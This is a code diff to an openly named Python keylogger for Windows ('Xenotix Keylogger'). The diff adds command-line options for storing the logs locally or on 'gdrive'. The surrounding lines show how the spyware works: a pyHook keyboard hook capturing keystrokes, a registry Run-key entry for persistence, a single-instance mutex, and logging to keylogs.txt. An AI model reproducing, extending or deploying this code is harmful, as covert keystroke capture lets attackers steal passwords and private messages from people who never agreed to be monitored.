@@ -1,3 +1,5 @@
+# -*- coding: utf-8 -*-
+
 try:
     import pythoncom
     import pyHook
@@ -9,6 +11,7 @@ import sys
 import win32event
 import win32api
 import winerror
+import argparse
 
 # Disallowing Multiple Instance
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
@@ -50,7 +53,7 @@ class Keylogger():
 
         SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, new_file_path)
 
-    # Local Keylogger
+    # Local storage of logs
     def local(self):
         if len(self.data) > 0:
             with open("keylogs.txt", "a") as log_file:
@@ -95,6 +98,10 @@ class Keylogger():
         return True
 
 if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description="Keylogger")
+    parser.add_argument('-l', default='local', help='How to store logs [local|gdrive]')
+    args = parser.parse_args()
+
     obj = pyHook.HookManager()
     kl = Keylogger()
     obj.KeyDown = kl.OnKeyboardEvent
